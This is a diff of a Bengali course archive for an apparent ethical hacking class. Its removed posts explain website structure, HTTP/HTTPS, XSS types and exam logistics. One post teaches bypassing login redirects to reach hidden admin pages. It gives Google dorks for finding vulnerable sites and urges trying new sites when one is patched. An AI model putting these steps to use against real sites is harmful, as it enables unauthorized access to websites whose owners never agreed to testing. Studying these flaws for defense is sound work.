-৩) একটি সাইট ওয়েব সার্ভারে কেমন থাকে সেটার চিত্র।
-৪) এডমিনের কাজ করার জন্য কিছু ফাইল( যেমন addDate.php, addFestival.php,addLedger.php, adminHome.php,editInvoice.php, ইত্যাদি) যা আমরা ওয়েব পেইজে দেখতে পাইনা।
-আশাকরি আর বিস্তারিত কিছু লেখার প্রয়োজন হবে না।
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-130)
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614256456943610)
+### entry-134 — Kali Tools Setup — Java, Go ও Burp Suite
 
-## আসুন জেনে নেই- ৪
+বিষয়: Linux & Scripting · তারিখ: 2026-09-20 · ধরন: recordings
 
-Date: 2026-08-01 · Category: information · ID: entry-5
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-134)
 
-আসুন জেনে নেই- ৪
-(Session Hijacking)
-নো-রিডাইরেক্ট কি ও নো-রিডাইরেক্ট নিয়ে আলোচনা!!
-প্রথম কথায় নো-রিডাইরেক্ট হলো সাইটের একটা বাগ।
-বিষয়টা বোঝার আগে একটি ওয়েবসাইটের ষ্ট্রাকচার জানা থাকলে বিষয়টি ভালো ভাবে বোঝা যাবে।
-একটি ওয়েবসাইটে প্রাথমিকভাবে ২টি বিষয় আছে,
-একটি হলো ফ্রন্ট ইন্ড-
-মানে আমারা যা দেখি, এই ফ্রন্ট-ইন্ডটি হলো সাধারন উইজার এর জন্য। যেমন: ইনডেক্স পেইজ বা হোম পেইজ https://arenawebsecurity.net/index.php
-(যদি কেউ ব্রাউজারে arenawebsecurity.net টাইপ করে এন্টার করেন তাহলে মূলত https://arenawebsecurity.net/index.php পেইজটি ওপেন হয়। আপনারা সাইটটি তে গেলে যা দেখছেন তা আসলে index.php ফাইল। ) আবার সাইটিতে গেলে সেখানে বিভিন্ন সাবমেনু বা সাব কনটেন্টে যাওয়ার অপশন থাকে, যেমন চিত্র-২ এ দেখুন- HOME, ABOUT US, COURSE, BLOG, SERVICE,FAQ, CONTACT US etc..
-এর মধ্যে যেমন - ABOUT US এ ক্লিক করলে (https://arenawebsecurity.net/about.php) পেইজে বা CONTACT US এ ক্লিক করলে (https://arenawebsecurity.net/contact.php) পেইজে নিয়ে নিয়ে যায় আবার হোম এ ক্লিক করলে ইনডেক্স পেইজে নিয়ে আসে। COURSE এ ক্লিক করলে সাবমেনু দেখায়।
-এবার বলি ২য়টি (ব্যাক ইন্ড)
-২য়টি হলো এডমিনিষ্টিটিভ কাজের জন্য এবং এই পার্টটি মূলতঃ এডমিন প্যানেল মেম্বারদের জন্য। সাধারন ইউজাররা এই সব ওয়েব লিংক গুলো দেখতে পাননা (সাধারণত ওয়েবসাইটের কোথাও এডমিন মেম্বারদের লগ-ইন পেইজের মেনু বা লিংক ও দেয়া থাকে না।)
-মনে করুন, এরিনা ওয়েবসাইটের এডমিন প্যানেলে ৪ জন প্যনেল ইউজার আছে। তার মধ্যে একজন ইউজার( ahaque) সাইটের লগ-ইন করার পর সে শুধু লেটষ্ট ‍নিউজ সহ কিছু ইনফরমেশন আপডেট করার প্রিভিলাইজ আছে। তাহলে কেমন হতে পারে তার ডেসবোর্ড বা কর্য ক্রমের অপশন -
-https://arenawebsecurity.net/admin/editnews.php
-https://arenawebsecurity.net/admin/editfaq.php
-তাহলে ahaque ইউজারের উপরের ২টি লিংক এ এক্সেস আছে যা দিয়ে সে লেটেষ্ট নিউজ এর frequently asked questions (FAQ‍) এর ডেটা পরিবর্তন করতে পারেন।
-আবার ইউজার arena সে সুপার এডমিন, সে সাইটে ছবি সহ বিভিন্ন কনটেন্ট আপলোড করতে পারেন। যেমন:
-https://arenawebsecurity.net/admin/slider/editslider.php
-https://arenawebsecurity.net/admin/gallery/editgallery.php
-এটাই হলো সংক্ষিপ্ত ওয়েবসাইটের ষ্ট্রাকচার।
-(ওয়েবসাইটের ষ্ট্রাকচার নিয়ে ভবিষৎতে আরো আপডেট করবো ইনশাআল্লাহ্)
-সাইটের ষ্ট্রকচার থেকে ২টি বিষয় বুজলাম-
-ক) ওয়েব সাইটে যে কনটেন্ট গুলো দেখা যায় সেগুলো যেমন লিংক(https://arenawebsecurity.net/contact.php) তেমনি এডমিনদের জন্য ও লিংক আছে(https://arenawebsecurity.net/admin/slider/editslider.php) যে সব লিংক দিয়ে সাইটের কনটেন্ট ম্যানেজ করার।
-খ) এডমিন লিংকগুলো হিডেন থাকে, সাধারন উইজার রা দেখকে পান না।
-‍আর সেই কারনে হ্যাকাররা চায় যে কোন সাইটের এডমিন এক্সেস নেয়ার জন্য। এডমিন এক্সেস পেলে সে সাইটের কনটেন্ট পরিবর্তন- পরিমার্জন করার ‍লিংকগুলো পাবে।
-এখন আসি নো-রিডাইরেক্ট বিষয়টা নিয়ে-
-মনে করুন আমরা কোন ভাবে গেজ(ধারনা করলাম) করলাম বা শিউরই হলাম যে সাইটে editslider.php বা editproduct.php নামক ফাইল আছে।
-মানে এই রকমঃ https://arenawebsecurity.net/admin/slider/editslider.php বা
-http://xyz.net/admin/editproduct.php
-এখন যদি লিংকটি ওয়েব ব্রাউজারে লিখে এন্টার করি http://xyz.net/admin/editproduct.php দেখা যাচ্ছে যে এই লিংকটি সরে গিয়ে ব্রাউজারে শো করছে http://xyz.net/admin/login.php বা http://xyz.net/admin/index.php
-আমি কোন লিংকে ব্রাউস করতে চেয়েছিলাম ?
-http://xyz.net/admin/editproduct.php এইটা।
-কি হলো?
-ঐ লিংক রি-ডাইরেক্ট হয়ে চলে আসলো http://xyz.net/admin/index.php
-আমি চেয়েছিলাম একটি লিংক ব্রাউস করতে কিন্তু সাইট আমাকে রি-ডাইরেক্ট করে অন্য লিংকে নিয়ে গেল, এখন কোন ভাবে যদি আমি এই রি-ডাইরেক্ট প্রসেসটাকে অফ করে দিতে পারি তাহলে কি হবে?
-আমি আমার কাংঙ্খিত লিংকে ব্রাউজ করতে পারবো।
-সেজন্য আমরা ফায়ার ফক্সের বা সাইবার ফক্সের নো-রিডাইরেক্ট এড-অন্স টি ব্যবাহার করবো।
-আচ্ছা এই সব সাইট কিভাবে খুঁজে পাব?
-খোঁজার জন্য আমাদের গুগলের সহায়তা নিতে হবে, মানে গুগল ডর্ক(গুগল ডর্ক নিয়ে আগে কয়েটি পোষ্ট গ্রুপে আছে, দেখে নিতে পারেন , এছাড়াও এর পরের পোষ্টেও ডর্ক দেবার ট্রাই করবো।)
-=> আমাদের এমন সাইটগুলো খুঁজে বের করতে হবে যে সকল সাইটের ইউআর এল এ admin বা administrator আছে,
-তারপর যে কোন পিইএইপি ফাইল আছে (সাথে সাইট দিয়ে আরো কাষ্টম করে নিতে পারেন)
-যেমনঃ intitle:"index" of "admin" site:.in
-inurl: admin/login.php site:.in
-শুরুতেই বলেছি এটা একটা বাগ, বাগ ফিক্স ও হয়ে যেতে পারে, বুঝবো কেমনে যে সাইটটিতে নো-রিডাইরেক্ট বাগ টি ফিক্স হয়েছে কিনা?
-এই বাগ কে কাজে লাগিয়ে সাইটের এডমিন এক্সেস নেয়া যায়। একটি সাইটে একাধিক লিংক ওপেন থাকতে পারে, কিন্তু সবগুলো লিংকই যে নো-রিডাইক্টে এড-অনসে কাজ করবে তা কিন্তু নয়। সাইটের এডমিন বা ডেভেলাপার যখন দেখে কোন লিংকে এই বাগ রয়ে গেছে বা ঐ লিংক দিয়ে হ্যাকার রা এক্সেস নিয়ে সাইট দখল করেছে তখন তা ফিক্স করে নেয়।
-ফিক্স করা লিংক গুলো তে নো-রিডাইরেক্ট ব্যবহার করলে সাদা স্ক্রিণ আসে।
-তখন আপনাকে দেখতে হবে ঐ সাইটে আর অন্য কোন লিংক ওপেন আছে কিনা, সেগুলোতে ট্রাই করতে হবে। আর যদি ঐ সাইটের সব লিংক ই সেইম সাদা স্ক্রিণ আসে, তাহলে ঐ সাইট ফিক্স করা হয়ে গেছে, অন্য সাইট এ ট্রাই করতে হবে।
-ধন্যবাদ।
+### entry-142 — Advanced LFI, Path Traversal ও RCE Lab
 
-- [Resource](https://arenawebsecurity.net/index.php)
-- [Resource](https://arenawebsecurity.net/about.php)
-- [Resource](https://arenawebsecurity.net/contact.php)
-- [Resource](https://arenawebsecurity.net/admin/editnews.php)
-- [Resource](https://arenawebsecurity.net/admin/editfaq.php)
-- [Resource](https://arenawebsecurity.net/admin/slider/editslider.php)
-- [Resource](https://arenawebsecurity.net/admin/gallery/editgallery.php)
-- [Resource](http://xyz.net/admin/editproduct.php)
-- [Resource](http://xyz.net/admin/login.php)
-- [Resource](http://xyz.net/admin/index.php)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614255560277033)
+বিষয়: LFI & Server Security · তারিখ: 2026-09-25 · ধরন: recordings
 
-## Noredirect Practice
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-142)
 
-Date: 2026-08-02 · Category: information · ID: entry-3
+### entry-145 — WordPress, phpMyAdmin ও Elementor
 
-Noredirect Practice
+বিষয়: WordPress · তারিখ: 2026-09-27 · ধরন: recordings
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614257613610161)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-145)
 
-## INFORMATIONAL POST-03
+### entry-147 — Recon — VPS ও Shodan Setup
 
-Date: 2026-08-02 · Category: information · ID: entry-62
+বিষয়: Recon · তারিখ: 2026-10-02 · ধরন: recordings
 
-INFORMATIONAL POST-03
-অনেকেই HTTP & HTTPS নিয়ে ঝামেলায় পড়েছেন, একটু সহজ করে দেই বিষয়টা।।
-HTTP & HTTPS
-কোন ওয়েভসাইট যেমন ধরুন আপনি ইত্তেফাক নিউজ পেপারটি পড়তে চান, তাহলে কি করবেন??
-ব্রাইজারে যাবেন তারপর সেখানে ইত্তেফাক নিউজ পেপারের ওয়েবের এড্রেসটি (ittefaq.com.bd )
-বা তার আইপি এড্রেসটি দিয়ে এন্টার করলে ইত্তেফাক নিউজপেপারটি পড়তে পারবেন।
-তো এই ওয়েব এড্রেসটি দিতে শুরু করতে হয় http দিয়ে। যেমনঃ http://ittefaq.com.bd/
-http://www.ittefaq.com.bd/
-আর তারপর সাইটের কন্টেন্ট গুলো চলে আসে, আমাদের পিসি বা মোবেইলের ব্রাউজার হলো ক্লাইন্ট, আর ইত্তেফাক
-‍
-নিউজপেপারটি কোন এক সার্ভারে রাখা আছে, সেই সার্ভারে কানেক্ট করে সেই পেইজ বা ফাইল কে রিকোয়েষ্ট করে এবং সেই সার্ভার আপনার ব্রাউজার কে রেসপন্স করে কনটেন্ট গুলো দেখায়। বিষয়টি হলো এমন- আপনি কারো বাসায় একটি পার্সেল পাঠাতে চান, তাহলে কি লাগবে? সেই বাড়ির নাম, সেই বাড়ির নাম্বার, এলাকার নাম, বর্তমান লোকেশন। http হল ওয়েব পেইজের ঠিকানা, রোড নম্বরের মত। পূর্ণ নাম- হাইপার টেক্সট ট্রান্সফার প্রটোকল Hypertext Transfer Protocol (HTTP)। মূলতঃ http একটি অনুরোধ প্রোটোকল যা ক্লায়েন্ট এবং সার্ভারের মধ্যে যোগাযোগের মাধ্যম গঠন করে। আমরা আমাদের পিসি বা মোবাইল থেকে কোন ব্রাউজারে লিখি www.ittefaq.com.bd
-Client এর যে File বা লিংক এর দরকার পরে তার রিকোয়েস্ট Server কে পাঠায় এবং সার্ভার সেই ফাইল টি খুঁজে ক্লায়েন্টকে সেন্ড করে ।
-সো একটি বিষয় ক্লিয়ার সেটা হলো হলো http একটি প্রটোকল।
-দিনে দিনে এই রিকোয়েষ্ট টেকনোলজি, প্রটোকল সবকিছুই অনেক আপডেট হয়েছে। এখন আর এত কিছু লেখার প্রয়োজন হয় না। ব্রাউজারে গিয়ে শুধুমাত্র ওয়েব এড্রেসটি লিখলেই ব্রাউজার সার্ভারের সাথে কানেক্ট হওয়ার প্রটোকল খুঁজে নেয়। তাই ittefaq.com.bd লিখলেই সে বুঝে নেয় এটা হলো http://www.ittefaq.com.bd/
-HTTPS
-:
-HTTPS = HTTP + SSL
-HTTPS এর পুর্ণরুপ হচ্ছে HyperText Transfer Protocol Secure, মানে হলো HTTP এর সাথে SSL certificates যুক্ত হয়ে ডাটাগুলো এনক্রিপটেড ( Encrypted ) হয়ে পারাপার হয়, ফলে ডাটাগুলো নিরাপদ থাকে ।
-ওয়েভ সাইটের সেনসেটিভ ডাটা যেন লীক না হয় সেজন্য ওয়েভ সাইটগুলো সিকিউরিটির জন্য SSL (Secure Sockets Layer) certificates ব্যবহার করে ওয়েভ সার্ভার ও ইউজারের ব্রাউজারের মধ্যে একটি সিকিউর কানেকশন তৈরী করে যাতে এইচ টি টি পি ট্রান্সমিশন এর সময় ডাটা নিরাপদ থাকে।
-আর তাই আজকাল অনেক ওয়েব সাইট ই https প্রটোকল ব্যবহার করে থাকে, বিশেষ করে যে সমস্ত ওয়েব সাইট – এ পেমেন্ট সিস্টেম আছে কিংবা বিভিন্ন ব্যাংক গুলো বা গুরুত্বপূর্ন ওয়েভ সাইটগুলো যাদের ডাটা মিস উইস হলে সমস্যা হতে পারে সেসব সাইট ।
-https প্রটোকল ব্যবহার করা সাইটগুলোর বামে একটি তালার ছবি থাকে, মানে সিকিউর।
-https এ আপনার আর সার্ভারে কানেকশন স্টাবলিশ হওয়ার সাথে সাথে SSL সার্টিফিকেট এক্সচেঞ্জ হয়, এই সার্টিফিকেটে আপনার এবং সার্ভারের "পাবলিক কি" দেয়া থাকে। আপনি যা পাঠাবেন তা সার্ভারের পাবলিক কি দিয়ে এনক্রিপ্টেড হয়ে যাবে, সার্ভার যা ফেরত পাঠাবে তা আপনার পাবলিক কি দিয়ে এনক্রিপ্টেড হয়ে আসবে।
-আরো একটু সহজ করে বলি-
-http প্রটোকলের মাধ্যমে আপনি আপনার মোবাইল/ পিসির ব্রাউজার থেকে (মানে ক্লাইন্ট ইন্ড এটা) কোন একটি সার্ভারে একটি টেক্সট পাঠালেন যেমন ধরুনঃ ”বন্ধু কেমন আছিস- বল??” এখন আপনার পিসি থেকে ঔ সার্ভার এ যাওয়ার পথে যে কেউ ঐ ডাটা ধরতে পারলে সেও পড়তে পারবে আপনি কি ডাটা পাঠিয়েছেন,, এটাতো ভালো.. এখন যদি ডাটা টা GF বা BF এর কাছে পাঠানো কোন টেক্সট হয়, সেকি এতো ভালো কথা লিখবে??
-আচ্ছা যদি https প্রটোকলের মাধ্যমে হতো, তাহলে কি হতো??
-তাহলে ক্লাইন্ট থেকে সার্ভারে যে ডাটা যেত সেটা ইনক্রাপ্টেড হয়ে যেত, পথিমধ্যে কেউ পেলেও লাভ নাই, কি সব হিজিবিজি হিজিবিজি হিজিবিজি হিজিবিজি
-বাই দ্য ওয়ে- কোন প্রটোকলেই কেউ প্রেমপত্র পাঠায় না, জাষ্ট আপনাদের বোঝানোর জন্য বল্লাম।।
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/entry-147)
+- [সংরক্ষিত ফাইল/নোট](https://drive.google.com/file/d/1QtIQkLLqMQbIQWksRcWVzYcJ-9pKymBu/view)
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1614258413610081)
+### entry-1 — Topic: Malware Removal Live Project (Part 1)
 
-## Class 5 — Manual SQL Injection
+বিষয়: Malware Removal · তারিখ: যাচাই বাকি · ধরন: information
 
-Date: 2026-08-02 · Category: recordings · ID: entry-64
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-1)
 
-ক্লাস রেকর্ড
-০২/০৮/২০২৬
-1jM_cYQm5NjRde8Fusb61MX5rYvx9aeys
+### entry-17 — আসসালামু আলাইকুম। কেমন আছেন সবাই?
 
-- [Resource](https://drive.google.com/file/d/1jM_cYQm5NjRde8Fusb61MX5rYvx9aeys/view?usp=sharing)
+বিষয়: Orientation · তারিখ: যাচাই বাকি · ধরন: information
 
-## 1st-Mid Exam - Cyber Security & Ethical Hacking
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-17)
 
-Date: 2026-08-07 · Category: notices · ID: entry-73
+### entry-18 — আর এক ঘন্টা পরেই
 
-1st-Mid Exam - Cyber Security & Ethical Hacking
-Date: 7th August, 2026
-Time:
-General: 9:30 PM to 10:30PM
-Diploma: 9:30 PM to 11:00 PM
-Batch: 66 (Delta)
-Full Marks: 40
-বিশেষ সতকর্তাঃ সাইবার সিকিউরিটি এবং ইথিক্যাল হ্যাকিং কোর্সের শিক্ষার্থীরা CEHF Exam Link এ গিয়ে এক্সাম দিবেন। ১ বছর মেয়াদি সাইবার সিকিউরিটি ডিপ্লোমার শিক্ষার্থীরা Diploma Exam Link এ গিয়ে এক্সাম দিবেন। ভূল প্রশ্নে এক্সাম দিলে অনুপস্থিত হিসেবে গণ্য হবে, তাই এক্সাম দেওয়ার শুরুতেই যাচাই করে নিন, আপনি কোন বিভাগে এক্সাম দিচ্ছেন।
-যারা সাইবার সিকিউরিটিতে ভর্তি হয়ে ডিপ্লোমাতে ট্রান্সফার হয়েছেন, তারাও ডিপ্লোমাতে এক্সাম দিবেন।
-CEHF Exam Link:
-Diploma Exam Link:
-নির্দেশনাঃ
-১। এক্সাম লিংকে প্রবেশ করুন। ৯ঃ৩০ এর সময় অটোমেটিক এক্সাম পেপার একটিভ হয়ে যাবে। একবার পেজটি রিফ্রেশ করলেই এক্সাম দিতে পারবেন।
-২। প্রশ্ন ভালো করে পড়ে বুঝে তারপর সাবমিট করবেন। পেজ সর্বোমোট ৩ টি, next - next এরপর সাবমিট। submit এ ক্লিক করলে এক্সাম পেপার ক্লোজ হয়ে যাবে। তাই দেখে তারপর ক্লিক করবেন।
-৩। প্রতিটা প্রশ্নের সাথে পয়েন্ট দেওয়া আছে। উল্লেখ্য, ১ পয়েন্ট = ১ মার্ক। সর্বোমোট ৪০ নাম্বারে পরীক্ষা।
-৪। MCQ অথবা ভূল উত্তরে মাইনাস মার্কিং নেই।
-৫। পরীক্ষা ৯ঃ৩০ থেকে ১০ঃ৩০ পর্যন্ত এবং ১০ঃ৩০ এ অটোমেটিক বন্ধ হয়ে যাবে আর এক্সাম পেপার জমা হবে না। তাই অন্তত দুই মিনিট পূর্বেই জমা দেওয়ার চেষ্টা করবেন।
-৬। এক্সাম পেপার জমা দিলে আপনি কি কি উত্তর দিয়েছেন, তার একটি কপি স্বয়ংক্রিয় ভাবে আপনার ইমেইলে চলে যাবে।
-সবার এক্সামের জন্য শুভ কামনা।
-ধন্যবাদ। @everyone
+বিষয়: Orientation · তারিখ: যাচাই বাকি · ধরন: information
 
-- [Resource](https://forms.gle/QoRHJV6mKhTfJCAY8)
-- [Resource](https://forms.gle/qVZiF2ACHEeTrpBH7)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1620235829679006)
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-18)
 
-## Class 6 — Cross Site Scripting (XSS)
+### entry-19 — আজকে রাত ৯ টা ৩০ মিনিটে অরিয়েন্টেশন ক্লাস, মনে আছে তো?
 
-Date: 2026-08-09 · Category: recordings · ID: entry-80
+বিষয়: Orientation · তারিখ: যাচাই বাকি · ধরন: information
 
-ক্লাস রেকর্ড
-০৯/০৮/২০২৬
-1UZWV40Eb5VOoX2Me05qVFi-RkZ9_badp
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-19)
 
-- [Resource](https://drive.google.com/file/d/1UZWV40Eb5VOoX2Me05qVFi-RkZ9_badp/view?usp=sharing)
+### entry-21 — অরিয়েন্টেশন ক্লাসের পরবর্তী নির্দেশনা
 
-## আসুন জেনে নেই-০৫
+বিষয়: Orientation · তারিখ: যাচাই বাকি · ধরন: information
 
-Date: 2026-08-10 · Category: information · ID: entry-79
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-21)
 
-আসুন জেনে নেই-০৫
-ক্রস-সাইট স্ক্রিপ্টিং(XSS)
-এতো দিন ধরে ওয়েব সাইটে শুধু ইঞ্জেকশন ই তো দিলাম, তো দিলাম কিসের উপর ভিত্তি করে?
-যে সব ওয়েব সাইটে এস কিউ এল ইরর ছিল সে সকল সাইটে। তাহলে তো আমরা একটি বিষয় ক্লিয়ার হলাম, সেটা হলো ওয়েব সাইটে যদি কোন ভাবে কিছু ইনজেক্ট করা যায় তাহলে সেসকল সাইট হতে কোন না কোন তথ্য বের করা যাবে বা সেই সাইটের কনটেন্ট কিছু পরিবর্তন করা সম্ভব হবে। তাই না?
-এখন ওয়েবসাইট কারা তৈরী করে? অবশ্যই ডেভেলাপার রা। তারা ওয়েবসাইট তৈরী করতে গিয়ে অনকে সময়ই কোন না কোন ত্রুটি করে ফেলে বা থেকে যায় যেটা হওয়া টাই খুব স্বাভাবিক, কেননা তাকে বিভিন্ন পেইজ তৈরী করতে হয়, লগ-ইন মডিউল তৈরী করতে হয়, তাদের বিভিন্ন এক্সেস দেয়ার জন্য স্ক্রিপ্ট তৈরী করতে হয়, পরে সবগুলোকে একত্র করে পরিপূর্ণ একটি ওয়েবসাইট হয়। সেক্ষেত্রে কিছু না কিছু বাগ বা ত্রুটি থেকে যাওয়াটাই স্বাভাবিক।
-আর সেজন্যই তো আমরা, মানে ইথিক্যাল হ্যাকরা আছি। আমাদের কাজ হলো সেসকল ত্রুটি গুলো খুঁজে বের করা। এখন সেই ইররগুলো ফিক্স কে করবে? আমি? আপনি??
-আচ্ছা বলুন তো আপনার বা আমার কাছে কি সেই ওয়েবসাইটের সোর্স কোড আছে? বা ভেডেলাপরা কি দিবে আমাকে বা আপনাকে তার কষ্টের তৈরী করা ওয়েবসাইটের সোর্স কোড? কি মনে হয় আপনার??
-সো, আমাদের যে বিষয়গুলো জানতে হবে- সেটা হলো একটি ওয়েব সাইটে কি কি বাগ বা ত্রুটি থাকেত পারে, সেগুলো কিভাবে আইডেন্টিফাই করা যাবে এবং সেগুলো কেমন অথবা কি ধরনের বাগ।
-যাক মূল বিষয়ে আসি-
-বিভিন্ন ওয়েব সাইটে ভিজিটর বা ক্লায়েন্ট থেকে বিভিন্ন তথ্য নেয়ার ব্যবস্থ্যা থাকে, যেমনঃ সাইটের বিভিন্ন তথ্য খুঁজার জন্য সার্চ অপশন, লগ-ইন ফর্ম, বা কোন ইনপুট করা যায় এমন ফিল্ড বা ফর্ম, কমেন্ট ফিল্ড ইত্যাদি। আর এইসব সার্চ বা ইন-পুট ফর্মে ডেটা ইনপুটের জন্য অনেক ওয়েব সাইটেই জাভা স্ক্রিপ্ট ব্যবহারের এক্সেস দিয়ে থাকে। তখন ঐ সকল ওয়েব সাইটে জাভা স্ক্রিপ্ট ইনজেক্ট করানো সম্ভব হয়।
-ক্রস-সাইট স্ক্রিপ্টিং(XSS) হলো আরো একটি ইঞ্জেকশন মেথড। যে মেথডের সাহায্যে Vulnerable (মানে যে সকল ওয়েব সাইটে ইনপুট ফিল্ডে জাভা স্ক্রিপ্ট ইনজেক্ট কবা যায়) ওয়েভ সাইটে ম্যালিসিয়াস কোড স্পেশালী জাভা কোড ইঞ্জেক্ট করে ওয়েভ সাইটের সেনসেটিভ তথ্য বের করা যায় বা নিয়ন্ত্রন করা যায় তাকেই ক্রস-সাইট স্ক্রিপ্টিং(XSS) এট্যাক বলা হয়ে থাকে।
-কোন সাইটে এক্সএসএস(XSS ) ভরানাবেলিটি থাকলে সমস্য হলো সে সকল সাইটে শুধু জাভা বা ম্যালিসিয়াস কোড ই না অনেক ক্ষেত্রে মেলওয়্যার, ফিশিং ও ইনজেক্ট হতে পারে।
-জাভা স্ক্রিপ্টঃ
-জাভাস্ক্রিপ্ট হল একটি ক্রস প্লাটফর্ম অবজেক্ট অরিয়েন্টেড স্ক্রিপ্টিং ল্যাঙ্গুয়েজ। জাভাস্ক্রিপ্টের একটি বড় সুবিধা হল অনেক ছোট প্রোগ্রাম বা কোডের সাহায্যে অনেক বড় বড় কাজ করা যায় বা আউটপুট দেয়া যায়।আবার অন্যভাবে দেখলে বলা যায় জাভাস্ক্রিপ্ট হল একটি ক্লাইন্ট সাইড স্ক্রিপ্টিং ল্যাংগুয়েজ (মানে যে ওয়েব ব্রাউজ করবে তার ব্রাউজার এই স্ক্রিপ্টগুলোকে run/execute করবে) বা ব্রাউজার স্ক্রিপ্টিং ল্যাঙ্গুয়েজ(প্রোগ্রামিং ল্যাঙ্গুয়েজের সহজ ও সংক্ষিপ্ত রূপ। )।
-সাথে এক বাক্যে জানিয়ে দিচ্ছি- জাভা এবং জাভাস্ক্রিপ্ট একই রকম মনে হলেও কিন্তু দুটো আলাদা বিষয়।
-জাভা একটি অবজেক্ট ভিত্তিক প্রোগ্রামিং ভাষা। আর জাভাস্ক্রিপ্ট ইন্টারনেটে ব্যবহৃত অন্যতম সবচেয়ে জনপ্রিয় স্ক্রিপ্টিং ল্যাংগুয়েজ, যা ওয়েব পেজগুলিকে আরও গতিশীল এবং ইন্টারেক্টিভ হিসাবে ব্যবহার করতে ব্যবহৃত হয়। জাভাস্ক্রিপ্ট জাভা প্রোগ্রামিং ল্যাঙ্গুয়েজ থেকে ভিন্ন।
-ক্রস-সাইট স্ক্রিপ্টিং এর মাধ্যমে কি কি ক্ষতি হতে পারে?
-এক্সএসএস(XSS ) এট্যাকের মাধ্যমে একজন হ্যাকার কুকিস চুরি থেকে শুরু করে ফিসিং বা কি-লগীং ও করতে পারে।
-কুকি (cookie) চুরিঃ আক্রমণকারী document.cookie ব্যবহার করে ওয়েবসাইটের সাথে সম্পর্কিত ব্যবহারকারীর কুকিজ (cookies) অ্যাক্সেস করতে পারে এবং সেগুলি তার নিজস্ব সার্ভারে প্রেরণ করতে পারে। সেশন (session) আইডির মতো সংবেদনশীল তথ্য ব্যবহার করে ব্যবহারকারীর একাউন্টের নিয়ন্ত্রণ নিতে পারে।
-কী লগিং (Key logging): আক্রমণকারী addEventListener মেথড ব্যবহার করে ব্যবহারকারীর কীবোর্ডের প্রতিটি কীস্ট্রোক (keystrokes) রেকর্ড করে তার নিজস্ব সার্ভারে প্রেরণ করতে পারে। এভাবে ব্যবহারকারীর সংবেদনশীল তথ্য যেমন পাসওয়ার্ড এবং ক্রেডিট কার্ড নম্বর ইত্যাদি আক্রমণকারী পেতে পারে।
-ফিশিং (Phishing): আক্রমণকারী dom ম্যানিপুলেশনের মাধ্যমে ওয়েবসাইটে একটি নকল (fake) লগইন ফর্ম তৈরি করে ব্যবহারকারীকে ফাঁদে ফেলে তার সংবেদনশীল তথ্য হাতিয়ে নিতে পারে।
-ক্রস-সাইট স্ক্রিপ্টিং এর প্রকারভেদ
-যদিও ক্রস-সাইট স্ক্রিপ্টিং আক্রমণের লক্ষ্য সর্বদাই ব্যবহারকারীর ব্রাউজারে ক্ষতিকর জাভাস্ক্রিপ্ট কোড চালানো, তবে সেই লক্ষ্য অর্জনের বিভিন্ন উপায় রয়েছে। ক্রস-সাইট স্ক্রিপ্টিং আক্রমণ সাধারনত তিন ধরনেরঃ
-Reflected XSS, যেখানে ক্ষতিকর কোডটির উৎস হচ্ছে ব্যবহারকারীর ওয়েব রিকোয়েষ্ট।
-Persistent XSS, যেখানে ক্ষতিকর কোডটির উৎস হচ্ছে ওয়েবসাইটের ডাটাবেস।
-DOM-based XSS, যেখানে ক্লায়েন্ট সাইড কোডের দুর্বলতার জন্য ক্রস-সাইট স্ক্রিপ্টিং আক্রমণ সংঘটিত হয়।
-এতটুকু যদি সত্যিই বুঝে থাকেন তাহলেই যথেষ্ট।। আশা করি এবার ক্লাস ভিডিটি দেখলে পুরো বিষয় বুঝতে আর কোন সমস্যা হবে না।। বাকীটা ক্লাস ভিডিও দেখে প্র্যাকটিক্যালী শিখে নিন।
+### entry-22 — Orientation Class: B66 Delta
 
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1622087516160504)
+বিষয়: Orientation · তারিখ: 2026-07-19 · ধরন: documents
 
-## Messenger Group Notice!!
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/entry-22)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/entry-22.txt)
 
-Date: 2026-08-10 · Category: notices · ID: entry-82
+প্রকাশিত পাঠ: lab-scoped-redacted
 
-Messenger Group Notice!!
-আপনাদের অফিশিয়ালি মেসেঞ্জার গ্রুপ খোলা হয়েছে। ইতিমধ্যে সবাইকে মেসেঞ্জার গ্রুপটিতে যুক্ত করা হয়েছে। আপনারা আপনাদের মেসেজ রিকোয়েস্ট কিংবা স্প্যাম ফোল্ডার চেক করলেই ব্যাচ এর নাম দেখতে পাবেন। অবশিষ্ট কিছু শিক্ষার্থী যারা এখনো অব্দি অ্যাড হতে পারেননি তাদের জন্য পরবর্তী ইন্সট্রাকশন গ্রুপে পোস্ট করা হবে।
-মেসেঞ্জার গ্রুপ ব্যবহারের নির্দেশনা:
-এই মেসেঞ্জার গ্রুপটি মূলত শিক্ষার্থীদের পারস্পরিক যোগাযোগের জন্য।
-আপনারা এখানে একে অপরের সঙ্গে আলোচনা করে ক্লাস বা কোর্স-সংক্রান্ত সাধারণ সমস্যাগুলো সমাধান করবেন।
-একাডেমিক অফিসিয়াল সাপোর্ট ও নোটিশ সংক্রান্ত বিষয়গুলো ফেসবুক গ্রুপেই প্রদান করা হবে, মেসেঞ্জারে নয়।
-আপনাদের সহযোগিতার জন্য ধন্যবাদ।
